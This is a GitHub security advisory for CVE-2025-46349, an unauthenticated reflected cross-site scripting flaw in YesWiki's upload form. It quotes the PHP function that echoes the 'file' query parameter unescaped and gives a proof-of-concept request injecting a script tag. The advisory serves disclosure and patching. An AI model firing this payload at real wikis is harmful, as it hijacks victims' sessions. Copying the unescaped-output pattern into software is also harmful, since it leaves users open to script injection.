# [H] YesWiki Vulnerable to Unauthenticated Reflected Cross-site Scripting

## Summary
Severity: High
Advisory: GHSA-2f8p-qqx2-gwr2
CVE: CVE-2025-46349
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:L (CVSS_V3)
Published: 2025-04-29
Source: https://github.com/advisories/GHSA-2f8p-qqx2-gwr2
Type: github-advisory

## Affected
- Packagist: `yeswiki/yeswiki` — affected >=0

## Details
### Summary
Reflected XSS has been detected in the file upload form. Vulnerability can be exploited without authentication

This Proof of Concept has been performed using the followings:

- YesWiki v4.5.3 (doryphore-dev branch)
- Docker environnment (docker/docker-compose.yml)

### Vulnerable code
The vulnerability is located in the [file](https://github.com/YesWiki/yeswiki/blob/6894234bbde6ab168bf4253f9a581bd24bf53766/tools/attach/libs/attach.lib.php#L724-L735)
```
        public function showUploadForm()
        {
            $this->file = $_GET['file'];
            echo '<h3>' . _t('ATTACH_UPLOAD_FORM_FOR_FILE') . ' ' . $this->file . "</h3>\n";
            echo '<form enctype="multipart/form-data" name="frmUpload" method="POST" action="' . $this->wiki->href('upload', $this->wiki->GetPageTag()) . "\">\n"
                . '	<input type="hidden" name="wiki" value="' . $this->wiki->GetPageTag() . "/upload\" />\n"
                . '	<input type="hidden" name="MAX_FILE_SIZE" value="' . $this->attachConfig['max_file_size'] . "\" />\n"
                . "	<input type=\"hidden\" name=\"file\" value=\"$this->file\" />\n"
                . "	<input type=\"file\" name=\"upFile\" size=\"50\" /><br />\n"
                . '	<input class="btn btn-primary" type="submit" value="' . _t('ATTACH_SAVE') . "\" />\n"
                . "</form>\n";
        }
```
### PoC
1. You need to send a request to endpoint and abusing the `file` parameter, we can successfully obtain client side javascript execution
```
GET /?PagePrincipale/upload&file=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: localhost:8085
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="135", "Not-A.Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
2. Get a response
<img width="853" alt="Снимок экрана 2025-04-11 в 02 04 55" src="https://github.com/user-attachments/assets/b923f563-ead5-494c-8fbd-1c3b11635820" />


### Impact
This vulnerability allows any malicious unauthenticated user to create a link that can be clicked on in the victim context to perform arbitrary actions

## References
- https://github.com/YesWiki/yeswiki/security/advisories/GHSA-2f8p-qqx2-gwr2
- https://nvd.nist.gov/vuln/detail/CVE-2025-46349
- https://github.com/YesWiki/yeswiki/pull/1264/commits/6edde40eb7eeb5d60619ac4d1e0a0422d92e9524
- https://github.com/YesWiki/yeswiki/commit/0dac9e2fb2a5e69f13a3c9f761ecae6ed9676206
- https://github.com/YesWiki/yeswiki
- https://github.com/YesWiki/yeswiki/blob/6894234bbde6ab168bf4253f9a581bd24bf53766/tools/attach/libs/attach.lib.php#L724-L735
